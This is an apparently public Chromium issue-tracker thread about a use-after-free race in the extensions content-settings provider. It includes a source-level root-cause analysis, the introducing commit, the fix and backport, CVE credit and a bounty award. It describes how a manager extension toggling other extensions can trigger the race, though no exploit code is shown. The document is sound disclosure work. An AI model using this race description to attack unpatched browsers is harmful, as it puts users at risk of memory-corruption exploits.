
The reproduced ASAN is a heap-use-after-free in `extensions::ExtensionInstallTimePermissionProvider::GetRuleIterator()`, and the ASAN report marks it as `MiraclePtr Status: NOT PROTECTED`.

The first relevant fact is that the content-settings provider interface explicitly requires `GetRuleIterator()` to be thread-safe and to keep working after UI-thread shutdown.

- [content\_settings\_provider.h](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:components/content_settings/core/browser/content_settings_provider.h;l=27-40)

```
  // Returns a |RuleIterator| over the content setting rules stored by this
  // provider. If |off_the_record| is true, the iterator returns only the
  // content settings which are applicable to the incognito mode and differ from
  // the normal mode. Otherwise, it returns the content settings for the normal
  // mode. It is not allowed to call other |ProviderInterface| functions
  // (including |GetRuleIterator|) for the same provider until the
  // |RuleIterator| is destroyed.
  // Returns nullptr to indicate the RuleIterator is empty.
  //
  // This method needs to be thread-safe and continue to work after
  // |ShutdownOnUIThread| has been called.
  virtual std::unique_ptr<RuleIterator> GetRuleIterator(
      ContentSettingsType content_type,
      bool off_the_record) const = 0;

```

This is the main contract violation. Any provider registered in `HostContentSettingsMap` must assume `GetRuleIterator()` can be called away from the UI thread. The vulnerable provider does not satisfy that contract.

The next relevant fact is that `ExtensionInstallTimePermissionProvider` stores a non-owning raw pointer to `ExtensionRegistry`.

- [content\_settings\_extension\_install\_time\_permission\_provider.h](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:extensions/browser/content_settings_extension_install_time_permission_provider.h;l=14-20)

```
// A provider that returns whether extensions have declared permissions in the
// manifest.
class ExtensionInstallTimePermissionProvider final
    : public content_settings::ObservableProvider {
 public:
  explicit ExtensionInstallTimePermissionProvider(
      extensions::ExtensionRegistry* extension_registry);

```

- [content\_settings\_extension\_install\_time\_permission\_provider.h](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:extensions/browser/content_settings_extension_install_time_permission_provider.h;l=47-49)

```
 private:
  raw_ptr<extensions::ExtensionRegistry> extension_registry_;
};

```

This is the first lifetime anchor. The provider does not own a snapshot of extension permission state. It stores a pointer to the live registry and consults it on demand.

The next relevant fact is that `HostContentSettingsMapFactory` registers this provider as a normal content-settings provider for profiles with extension support.

- [host\_content\_settings\_map\_factory.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:chrome/browser/content_settings/host_content_settings_map_factory.cc;l=144-162)

```
#if BUILDFLAG(ENABLE_EXTENSIONS_CORE)
  // These must be registered before before the HostSettings are passed over to
  // the IOThread.  Simplest to do this on construction.
  settings_map->RegisterProvider(
      ProviderType::kCustomExtensionProvider,
      std::make_unique<content_settings::CustomExtensionProvider>(
          extensions::ContentSettingsService::Get(original_profile)
              ->content_settings_store(),
          // TODO(crbug.com/40199565): This is the only call site, so can we
          // remove this constructor parameter, or should this actually reflect
          // the case where profile->IsOffTheRecord() is true? And what is the
          // interaction with profile->IsGuestSession()?
          false));

  settings_map->RegisterProvider(
      ProviderType::kExtensionInstallTimePermissionProvider,
      std::make_unique<extensions::ExtensionInstallTimePermissionProvider>(
          extensions::ExtensionRegistry::Get(context)));
#endif  // BUILDFLAG(ENABLE_EXTENSIONS_CORE)

```

After this registration, any caller of `HostContentSettingsMap::GetSettingsForOneType()` can reach the extension registry through the generic content-settings provider list. The call site does not know that this provider is backed by UI-thread-owned extension state.

The next relevant fact is that `ExtensionInstallTimePermissionProvider::GetRuleIterator()` directly iterates `extension_registry_->enabled_extensions()`.

- [content\_settings\_extension\_install\_time\_permission\_provider.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:extensions/browser/content_settings_extension_install_time_permission_provider.cc;l=72-93)

```
std::unique_ptr<content_settings::RuleIterator>
ExtensionInstallTimePermissionProvider::GetRuleIterator(
    ContentSettingsType content_type,
    bool off_the_record) const {
  auto api_permission = ContentSettingsTypeToApiPermission(content_type);
  if (!api_permission) {
    return nullptr;
  }

  if (!extension_registry_) {
    return nullptr;
  }

  std::vector<GURL> extensions;
  for (const scoped_refptr<const Extension>& extension :
       extension_registry_->enabled_extensions()) {
    if (extension->permissions_data()->HasAPIPermission(*api_permission)) {
      extensions.emplace_back(extension->url());
    }
  }

  return std::make_unique<ApiPermissionRuleIterator>(std::move(extensions));
}

```

This is the direct bug site. The method builds a vector snapshot of URLs, but it builds that snapshot by walking the live `ExtensionSet`. There is no lock, no UI-thread hop, no `SequenceChecker`, and no already-snapshotted copy of the extension list. If the live enabled set is mutated while this loop is running, the iterator can point to freed tree storage.

The next relevant fact is that `ExtensionInstallTimePermissionProvider` only handles geolocation and notifications, which are content setting types that Safety Hub can inspect during unused-site-permission processing.

- [content\_settings\_extension\_install\_time\_permission\_provider.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:extensions/browser/content_settings_extension_install_time_permission_provider.cc;l=22-31)

```
std::optional<extensions::mojom::APIPermissionID>
ContentSettingsTypeToApiPermission(ContentSettingsType content_type) {
  switch (content_type) {
    case ContentSettingsType::GEOLOCATION:
      return extensions::mojom::APIPermissionID::kGeolocation;
    case ContentSettingsType::NOTIFICATIONS:
      return extensions::mojom::APIPermissionID::kNotifications;
    default:
      return std::nullopt;
  }
}

```

This connects the provider to the PoC. The target extensions declare `geolocation` and `notifications`, so Safety Hub's content-settings enumeration reaches this provider and has real extension entries to iterate.

The next relevant fact is that `HostContentSettingsMap::AddSettingsForOneType()` calls the provider's `GetRuleIterator()` through the generic provider interface.

- [host\_content\_settings\_map.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:components/content_settings/core/browser/host_content_settings_map.cc;l=1024-1039)

```
void HostContentSettingsMap::AddSettingsForOneType(
    const content_settings::ProviderInterface* provider,
    ProviderType provider_type,
    ContentSettingsType content_type,
    ContentSettingsForOneType* settings,
    bool incognito,
    std::optional<SessionModel> session_model) const {
  std::unique_ptr<content_settings::RuleIterator> rule_iterator(
      provider->GetRuleIterator(content_type, incognito));
  if (!rule_iterator) {
    return;
  }

  while (rule_iterator->HasNext()) {
    std::unique_ptr<content_settings::Rule> rule = rule_iterator->Next();
    base::Value value = std::move(rule->value);

```

This call path relies on each provider honoring the thread-safety contract. It does not special-case extension-backed providers or force the extension provider to run on the UI thread.

The next relevant fact is that Safety Hub deliberately runs its expensive update work on a ThreadPool worker.

- [safety\_hub\_service.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:chrome/browser/ui/safety_hub/safety_hub_service.cc;l=41-45)

```
void SafetyHubService::UpdateAsyncInternal() {
  base::ThreadPool::PostTaskAndReplyWithResult(
      FROM_HERE, {base::TaskPriority::BEST_EFFORT}, GetBackgroundTask(),
      base::BindOnce(&SafetyHubService::OnUpdateFinished, GetAsWeakRef()));
}

```

This is the cross-thread entry point. Safety Hub is intentionally designed to run background computation off the browser UI thread.

The next relevant fact is that `RevokedPermissionsService::GetBackgroundTask()` passes a refcounted `HostContentSettingsMap` into `UnusedSitePermissionsManager::UpdateOnBackgroundThread()`.

- [revoked\_permissions\_service.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:chrome/browser/ui/safety_hub/revoked_permissions_service.cc;l=348-356)

```
base::OnceCallback<std::unique_ptr<SafetyHubResult>()>
RevokedPermissionsService::GetBackgroundTask() {
  bool revocation_backfill_completed =
      pref_change_registrar_->prefs()->GetBoolean(
          safety_hub_prefs::kUnusedSitePermissionsRevocationBackfillCompleted);
  return base::BindOnce(&UnusedSitePermissionsManager::UpdateOnBackgroundThread,
                        clock_, base::WrapRefCounted(hcsm()),
                        revocation_backfill_completed);
}

```

This keeps the `HostContentSettingsMap` object alive, but it does not make every provider inside that map thread-safe. The lifetime of the map and the thread-safety of provider internals are separate issues.

The next relevant fact is that the background update iterates website setting types and calls `hcsm->GetSettingsForOneType(type)`.

- [unused\_site\_permissions\_manager.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:chrome/browser/ui/safety_hub/unused_site_permissions_manager.cc;l=132-178)

```
// static
std::unique_ptr<SafetyHubResult>
UnusedSitePermissionsManager::UpdateOnBackgroundThread(
    base::Clock* clock,
    const scoped_refptr<HostContentSettingsMap> hcsm,
    bool revocation_backfill_completed) {
  auto result = std::make_unique<RevokedPermissionsResult>();

  const bool revocation_backfill_enabled = base::FeatureList::IsEnabled(
      permissions::features::
          kSafetyHubUnusedPermissionRevocationForAllSurfaces);
  // Pass the flag to UI thread to maintain consistency throughout the session.
  result->SetRevocationBackfillEnabled(revocation_backfill_enabled);
  if (revocation_backfill_enabled) {
    // Record whether the backfill was already completed for the user or not.
    UMA_HISTOGRAM_BOOLEAN(
        "Settings.SafetyHub.UnusedSitePermissionsModule.Backfill."
        "CompletionStatus",
        revocation_backfill_completed);

    if (!revocation_backfill_completed) {
      // Record the attempt to run the backfill code.
      UMA_HISTOGRAM_BOOLEAN(
          "Settings.SafetyHub.UnusedSitePermissionsModule.Backfill.RunStatus",
          false /*STARTED*/);
    }
  }

  UnusedSitePermissionsManager::UnusedPermissionMap recently_unused;
  UnusedSitePermissionsManager::UntimestampedPermissionList
      untimestamped_permissions;

  const base::Time threshold =
      clock->Now() - content_settings::GetCoarseVisitedTimePrecision();
  auto* website_setting_registry =
      content_settings::WebsiteSettingsRegistry::GetInstance();
  for (const content_settings::WebsiteSettingsInfo* info :
       *website_setting_registry) {
    ContentSettingsType type = info->type();
    if (!IsContentSetting(type)) {
      continue;
    }
    if (!content_settings::CanTrackLastVisit(type)) {
      continue;
    }
    ContentSettingsForOneType settings = hcsm->GetSettingsForOneType(type);

```

This is why the crash happens on a background thread. When the loop reaches a relevant content setting type such as geolocation or notifications, `HostContentSettingsMap` asks the new extension install-time provider for rules, and the provider reads the live extension registry from a ThreadPool worker.

The next relevant fact is that `ExtensionSet` is backed by a `std::map`, and its public iterator stores a `std::map` iterator.

- [extension\_set.h](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:extensions/common/extension_set.h;l=22-30)

```
// The one true extension container. Extensions are identified by their id.
// Only one extension can be in the set with a given ID.
class ExtensionSet {
 public:
  using ExtensionMap = std::map<ExtensionId, scoped_refptr<const Extension>>;

  // Iteration over the values of the map (given that it's an ExtensionSet,
  // it should iterate like a set iterator).
  class const_iterator {

```

- [extension\_set.h](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:extensions/common/extension_set.h;l=40-65)

```
    explicit const_iterator(ExtensionMap::const_iterator it);
    ~const_iterator();
    const_iterator& operator++() {
      ++it_;
      return *this;
    }
    const_iterator operator++(int) {
      const const_iterator old(*this);
      ++it_;
      return old;
    }
    const scoped_refptr<const Extension>& operator*() const {
      return it_->second;
    }
    const scoped_refptr<const Extension>* operator->() const {
      return &it_->second;
    }
    bool operator!=(const const_iterator& other) const {
      return it_ != other.it_;
    }
    bool operator==(const const_iterator& other) const {
      return it_ == other.it_;
    }

   private:
    ExtensionMap::const_iterator it_;

```

This is the concrete object layout behind the ASAN. A range-for over `ExtensionSet` holds a tree iterator. If another thread erases the current map node, the iterator's stored node pointer becomes dangling.

The next relevant fact is that `ExtensionSet::Remove()` erases from that same map.

- [extension\_set.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:extensions/common/extension_set.cc;l=76-82)

```
bool ExtensionSet::Remove(const ExtensionId& id) {
  return extensions_.erase(id) > 0;
}

void ExtensionSet::Clear() {
  extensions_.clear();
}

```

This matches the ASAN free stack. The freed allocation is the `std::map` tree node erased by `ExtensionSet::Remove()`.

The next relevant fact is that `chrome.management.setEnabled(id, false)` reaches `ManagementSetEnabledFunction::Run()` and calls the management delegate to disable the target extension.

- [management\_api.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:extensions/browser/api/management/management_api.cc;l=435-502)

```
ExtensionFunction::ResponseAction ManagementSetEnabledFunction::Run() {
  std::optional<management::SetEnabled::Params> params =
      management::SetEnabled::Params::Create(args());
  EXTENSION_FUNCTION_VALIDATE(params);
  extension_id_ = params->id;
  base::UmaHistogramBoolean(kSetEnabledHasUserGestureHistogramName,
                            user_gesture());

  if (ExtensionsBrowserClient::Get()->IsAppModeForcedForApp(extension_id_)) {
    return RespondNow(Error(keys::kCannotChangePrimaryKioskAppError));
  }

  ExtensionRegistry* registry = ExtensionRegistry::Get(browser_context());
  const Extension* target_extension = GetExtension();
  if (!target_extension || !ShouldExposeViaManagementAPI(*target_extension)) {
    return RespondNow(Error(keys::kNoExtensionError, extension_id_));
  }

  const ManagementPolicy* policy =
      ExtensionSystem::Get(browser_context())->management_policy();
  if (!policy->ExtensionMayModifySettings(extension(), target_extension,
                                          /*error=*/nullptr)) {
    return RespondNow(Error(keys::kUserCantModifyError, extension_id_));
  }

  // Do nothing if method wants to enable an already enabled extension, and
  // vice-versa.
  bool should_enable = params->enabled;
  bool currently_enabled =
      registry->enabled_extensions().Contains(extension_id_) ||
      registry->terminated_extensions().Contains(extension_id_);
  if ((should_enable && currently_enabled) ||
      (!should_enable && !currently_enabled)) {
    return RespondNow(NoArguments());
  }

  if (IsSupervisedExtensionApprovalFlowRequired(target_extension)) {
    // Either ask for parent permission or notify the child that their parent
    // has disabled this action.
    auto approval_callback = base::BindOnce(
        &ManagementSetEnabledFunction::OnSupervisedExtensionApprovalDone, this);
    AddRef();  // Matched in OnSupervisedExtensionApprovalDone().

    SupervisedUserExtensionsDelegate* supervised_user_extensions_delegate =
        ManagementAPI::GetFactoryInstance()
            ->Get(browser_context())
            ->GetSupervisedUserExtensionsDelegate();
    CHECK(supervised_user_extensions_delegate)
        << "Implied by IsSupervisedExtensionApprovalFlowRequired";
    supervised_user_extensions_delegate->RequestToEnableExtensionOrShowError(
        *target_extension, GetSenderWebContents(),
        std::move(approval_callback));
    return RespondLater();
  }

  // Disable extension.
  if (!should_enable) {
    const ManagementAPIDelegate* delegate = ManagementAPI::GetFactoryInstance()
                                                ->Get(browser_context())
                                                ->GetDelegate();
    auto reason = (extension() &&
                   (Manifest::IsPolicyLocation(extension()->location()) ||
                    Manifest::IsComponentLocation(extension()->location())))
                      ? disable_reason::DISABLE_BLOCKED_BY_POLICY
                      : disable_reason::DISABLE_USER_ACTION;
    delegate->DisableExtension(browser_context(), extension(), extension_id_,
                               reason);
    return RespondNow(NoArguments());
  }

```

This is the attacker-controlled mutation primitive used by the PoC. A manager extension can repeatedly disable and enable other extensions through the normal management API.

The next relevant fact is that the Chrome management delegate forwards disabling to `ExtensionRegistrar::DisableExtensionWithSource()`.

- [chrome\_management\_api\_delegate.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:chrome/browser/extensions/api/management/chrome_management_api_delegate.cc;l=207-217)

```
void ChromeManagementAPIDelegate::DisableExtension(
    content::BrowserContext* context,
    const Extension* source_extension,
    const ExtensionId& extension_id,
    disable_reason::DisableReason disable_reason) const {
  SupervisedUserExtensionsDelegate* extensions_delegate =
      GetSupervisedUserExtensionsDelegateFromContext(context);
  extensions_delegate->RecordExtensionEnablementUmaMetrics(/*enabled=*/false);
  ExtensionRegistrar::Get(context)->DisableExtensionWithSource(
      source_extension, extension_id, disable_reason);
}

```

The next relevant fact is that the registrar's disable path runs on the UI thread and removes the target extension from `registry_->enabled_extensions()`.

- [extension\_registrar.cc](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:extensions/browser/extension_registrar.cc;l=374-447)

```
void ExtensionRegistrar::DisableExtensionWithRawReasons(
    ExtensionPrefs::DisableReasonRawManipulationPasskey,
    const ExtensionId& extension_id,
    base::flat_set<int> disable_reasons) {
  DCHECK_CURRENTLY_ON(content::BrowserThread::UI);
  DCHECK(!disable_reasons.empty());

  scoped_refptr<const Extension> extension =
      registry_->GetExtensionById(extension_id, ExtensionRegistry::EVERYTHING);

  CHECK(delegate_);
  bool is_controlled_extension =
      !delegate_->CanDisableExtension(extension.get());

  if (is_controlled_extension) {
    // Remove disallowed disable reasons.
    // Certain disable reasons are always allowed, since they are more internal
    // to the browser (rather than the user choosing to disable the extension).
    base::flat_set<int> internal_disable_reasons = {
        extensions::disable_reason::DISABLE_RELOAD,
        extensions::disable_reason::DISABLE_CORRUPTED,
        extensions::disable_reason::DISABLE_UPDATE_REQUIRED_BY_POLICY,
        extensions::disable_reason::
            DISABLE_PUBLISHED_IN_STORE_REQUIRED_BY_POLICY,
        extensions::disable_reason::DISABLE_BLOCKED_BY_POLICY,
        extensions::disable_reason::DISABLE_CUSTODIAN_APPROVAL_REQUIRED,
        extensions::disable_reason::DISABLE_REINSTALL,
        extensions::disable_reason::DISABLE_UNSUPPORTED_MANIFEST_VERSION,
        extensions::disable_reason::DISABLE_NOT_VERIFIED,
        extensions::disable_reason::DISABLE_UNSUPPORTED_DEVELOPER_EXTENSION,
    };

    disable_reasons = base::STLSetIntersection<base::flat_set<int>>(
        disable_reasons, internal_disable_reasons);

    if (disable_reasons.empty()) {
      return;
    }
  }

  auto passkey = ExtensionPrefs::DisableReasonRawManipulationPasskey();

  // The extension may have been disabled already. Just add the disable reasons.
  if (!IsExtensionEnabled(extension_id)) {
    extension_prefs_->AddRawDisableReasons(passkey, extension_id,
                                           disable_reasons);
    return;
  }

  extension_prefs_->ReplaceRawDisableReasons(passkey, extension_id,
                                             disable_reasons);

  int include_mask =
      ExtensionRegistry::EVERYTHING & ~ExtensionRegistry::DISABLED;
  extension = registry_->GetExtensionById(extension_id, include_mask);
  if (!extension)
    return;

  // The extension is either enabled or terminated.
  DCHECK(registry_->enabled_extensions().Contains(extension->id()) ||
         registry_->terminated_extensions().Contains(extension->id()));

  // Move the extension to the disabled list.
  registry_->AddDisabled(extension);
  if (registry_->enabled_extensions().Contains(extension->id())) {
    registry_->RemoveEnabled(extension->id());
    DeactivateExtension(extension.get(), UnloadedExtensionReason::DISABLE);
  } else {
    // The extension must have been terminated. Don't send additional
    // notifications for it being disabled.
    bool removed = registry_->RemoveTerminated(extension->id());
    DCHECK(removed);
  }
}

```

The `DCHECK_CURRENTLY_ON(content::BrowserThread::UI)` line is important. The write side is intentionally a UI-thread operation. The bug is that the read side introduced by the content-settings provider can happen on a background worker.

The last relevant fact is that `ExtensionRegistry::RemoveEnabled()` is the public mutation point for removing an extension from the enabled set.

- [extension\_registry.h](https://source.chromium.org/chromium/chromium/src/+/4d564e1ca5359231126dccaca95689080af2da7f:extensions/browser/extension_registry.h;l=152-164)

```
  // Adds the specified extension to the enabled set. The registry becomes an
  // owner. Any previous extension with the same ID is removed.
  // Returns true if there is no previous extension.
  // NOTE: You probably want to use ExtensionService instead of calling this
  // method directly.
  bool AddEnabled(const scoped_refptr<const Extension>& extension);

  // Removes the specified extension from the enabled set.
  // Returns true if the set contained the specified extension.
  // NOTE: You probably want to use ExtensionService instead of calling this
  // method directly.
  bool RemoveEnabled(const std::string& id);

```

This is the final ownership transition. The UI thread removes an extension from the enabled registry set while the background Safety Hub task may still be iterating that same enabled set.

The introducing commit is `7307848029fabb938e5cce51d0e3581d1096a58b`, which added and registered `ExtensionInstallTimePermissionProvider`.

- [commit 7307848029fabb938e5cce51d0e3581d1096a58b](https://chromium.googlesource.com/chromium/src/+/7307848029fabb938e5cce51d0e3581d1096a58b)

```
commit 7307848029fabb938e5cce51d0e3581d1096a58b
AuthorDate: Mon Mar 16 18:26:20 2026 -0700

    Add new ExtensionInstallTimePermissionProvider

    It provides the status of permissions which are enabled via
    extension manifests.  Current analysis shows that only
    geolocation and notifications are relevant.

    With support for extensions in desktop android, the SiteSettings page should
    show when extensions have permissions enabled. Desktop looks up these
    permissions via site_settings_helper GetPermissionResultForOriginWithoutContext(),
    but it can be done via HostContentsSettingsMap by adding this new provider.

Cr-Commit-Position: refs/heads/main@{#1600254}
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7627082

```

The parent commit did not contain `ExtensionInstallTimePermissionProvider`, did not register `ProviderType::kExtensionInstallTimePermissionProvider`, and therefore did not expose the live extension registry through `HostContentSettingsMap`'s background-callable provider interface. That makes `7307848029fabb938e5cce51d0e3581d1096a58b` the first relevant bad commit for this UAF.

The root cause is not the management API by itself and not Safety Hub by itself. The management API's UI-thread mutation of the extension registry is normal, and Safety Hub's background use of `HostContentSettingsMap` is normal for providers that honor the `ProviderInterface` contract. The unsafe behavior appears when the new extension install-time provider is inserted into that provider list while internally reading UI-thread-owned `ExtensionRegistry` state without synchronization or snapshotting.

Taken together, the failing interleaving is:

1. Safety Hub posts `UnusedSitePermissionsManager::UpdateOnBackgroundThread()` to a ThreadPool worker.
2. The worker calls `HostContentSettingsMap::GetSettingsForOneType()` for geolocation or notifications.
3. `HostContentSettingsMap::AddSettingsForOneType()` calls `ExtensionInstallTimePermissionProvider::GetRuleIterator()`.
4. `GetRuleIterator()` starts range-iterating `extension_registry_->enabled_extensions()`, which is an `ExtensionSet` backed by `std::map`.
5. The manager extension calls `chrome.management.setEnabled(target_id, false)` on the UI thread.
6. `ExtensionRegistrar::DisableExtensionWithRawReasons()` calls `registry_->RemoveEnabled(extension->id())`.
7. `ExtensionSet::Remove()` erases a `std::map` node that the background iterator may still reference.
8. The background worker then increments or dereferences the stale `ExtensionSet::const_iterator`, producing a heap-use-after-free in `ExtensionInstallTimePermissionProvider::GetRuleIterator()`.

This also explains the ASAN free and access stacks. The access stack is in the background Safety Hub path under `ExtensionInstallTimePermissionProvider::GetRuleIterator()`. The free stack is in the UI-thread extension disable path under `ManagementSetEnabledFunction::Run()`, `ExtensionRegistrar::DisableExtensionWithRawReasons()`, and `ExtensionSet::Remove()`.

### zh...@gmail.com (2026-04-29)

I've updated with a poc.mov file that guarantees 100% stable reproduction of this UAF. I can guarantee that as long as you follow the steps in the video, you will be able to reproduce it reliably. Sometimes you may need to be patient, but the success rate is guaranteed to be 100%.

### ye...@google.com (2026-04-29)

I could not repro myself but the asan stack trace + video look convincing. Downgrading to s2 because the race takes a long time to hit, which feels like a mitigating factor to me.

### ch...@google.com (2026-04-30)

Setting milestone because of s2 severity.

### ch...@google.com (2026-04-30)

Setting Priority to P2 to match Severity s2. To ensure SLOs are tracked correctly, priority must match or exceed severity.

### jo...@chromium.org (2026-05-01)

Thanks for this report. Can I just check is there any proposed fix? I didn't notice any, but I might have missed something.

I remember hitting an asan failure when submitting that CL, but my fix mustn't have been enough. I probably need to do more in ExtensionInstallTimePermissionProvider::GetRuleIterator()

### jo...@chromium.org (2026-05-01)

I wasn't able to repro the failure on linux. But I have a fix at [crrev.com/c/7806867](https://crrev.com/c/7806867), @zh1x1an1221 could you check if that fixes it for you?

### zh...@gmail.com (2026-05-01)

No problem, I have the source code environment on my local machine. I will apply this fix diff here <https://chromium-review.googlesource.com/c/chromium/src/+/7806867> and then test and verify it again. Please give me some time.

### zh...@gmail.com (2026-05-01)

This patch successfully fixes the vulnerability; I can reproduce it by compiling edc9089e93a84e8c8877bcbf4cd6f8ea91d951f2. However, after applying this fix in this commit, the vulnerability can no longer be reproduced.

### dx...@google.com (2026-05-04)

Project: chromium/src  

Branch:  main  

Author:  Joel Hockey [joelhockey@chromium.org](mailto:joelhockey@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7806867>

Store values in OriginValueMap to fix threading issues

---


Expand for full commit details
```
     
    GetRuleIterator() must be thread safe, so it cannot access 
    ExtensionRegistry. This class is now an ExtensionRegistryObserver and 
    keeps an OriginValueMap of which extensions have permissions enabled. 
     
    Bug: 507356235 
    Change-Id: I4048793bd0a7b15dc1992ed84e293d767baeb8bd 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7806867 
    Reviewed-by: Reilly Grant <reillyg@chromium.org> 
    Commit-Queue: Joel Hockey <joelhockey@chromium.org> 
    Reviewed-by: Christian Dullweber <dullweber@chromium.org> 
    Reviewed-by: Elias Klim <elklm@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1624561}

```

---

Files:

- M `chrome/browser/content_settings/host_content_settings_map_factory.cc`
- M `chrome/browser/content_settings/host_content_settings_map_unittest.cc`
- M `extensions/browser/content_settings_extension_install_time_permission_provider.cc`
- M `extensions/browser/content_settings_extension_install_time_permission_provider.h`
- M `extensions/browser/content_settings_extension_install_time_permission_provider_unittest.cc`

---

Hash: [f571d6062862dac93885b588ddc2e5d3c4ae1f96](https://chromiumdash.appspot.com/commit/f571d6062862dac93885b588ddc2e5d3c4ae1f96)  

Date: Mon May 4 10:54:30 2026


---

### ch...@google.com (2026-05-05)

**M148** merge request created. **Please update [crbug/509739672](https://crbug.com/509739672) to have this merge reviewed.**

### dx...@google.com (2026-05-05)

Project: chromium/src  

Branch:  refs/branch-heads/7778  

Author:  Joel Hockey [joelhockey@chromium.org](mailto:joelhockey@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7808317>

[M148] Store values in OriginValueMap to fix threading issues

---


Expand for full commit details
```
     
    Original change's description: 
    > Store values in OriginValueMap to fix threading issues 
    > 
    > GetRuleIterator() must be thread safe, so it cannot access 
    > ExtensionRegistry. This class is now an ExtensionRegistryObserver and 
    > keeps an OriginValueMap of which extensions have permissions enabled. 
    > 
    > Bug: 507356235 
    > Change-Id: I4048793bd0a7b15dc1992ed84e293d767baeb8bd 
    > Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7806867 
    > Reviewed-by: Reilly Grant <reillyg@chromium.org> 
    > Commit-Queue: Joel Hockey <joelhockey@chromium.org> 
    > Reviewed-by: Christian Dullweber <dullweber@chromium.org> 
    > Reviewed-by: Elias Klim <elklm@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#1624561} 
     
    (cherry picked from commit f571d6062862dac93885b588ddc2e5d3c4ae1f96) 
     
    Bug: 509739672,507356235 
    Change-Id: I4048793bd0a7b15dc1992ed84e293d767baeb8bd 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7808317 
    Auto-Submit: chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com <chrome-cherry-picker@chops-service-accounts.iam.gserviceaccount.com> 
    Commit-Queue: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Bot-Commit: rubber-stamper@appspot.gserviceaccount.com <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/branch-heads/7778@{#2299} 
    Cr-Branched-From: 77f495ee216d4c3cc784d33658bad4778c0680ee-refs/heads/main@{#1610480}

```

---

Files:

- M `chrome/browser/content_settings/host_content_settings_map_factory.cc`
- M `chrome/browser/content_settings/host_content_settings_map_unittest.cc`
- M `extensions/browser/content_settings_extension_install_time_permission_provider.cc`
- M `extensions/browser/content_settings_extension_install_time_permission_provider.h`
- M `extensions/browser/content_settings_extension_install_time_permission_provider_unittest.cc`

---

Hash: [a7d1958a141e9121d5c32ae7fcd58e6848e9af1f](https://chromiumdash.appspot.com/commit/a7d1958a141e9121d5c32ae7fcd58e6848e9af1f)  

Date: Tue May 5 06:52:02 2026


---

### zh...@gmail.com (2026-05-15)

> [TBD][507356235] Medium CVE-2026-8587: Use after free in Extensions. Reported by zh1x1an1221 of Ant Group Tianqiong Security Lab on 2026-04-28

Hi team, I have a request regarding the CVE description for this vulnerability. I'm no longer with Ant Group Tianqiong Security Lab, so please change it to `zh1x1an1221 @zellic_io` to avoid unnecessary ambiguity. Thank you very much. I understand you have too many reports to process in the AI ​​era, and I apologize for the inconvenience.

### sp...@google.com (2026-06-22)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $6000.00 for this report.

Rationale for this decision:
Mildly mitigated racy with bisect.


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### eb...@google.com (2026-08-13)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/507356235)*
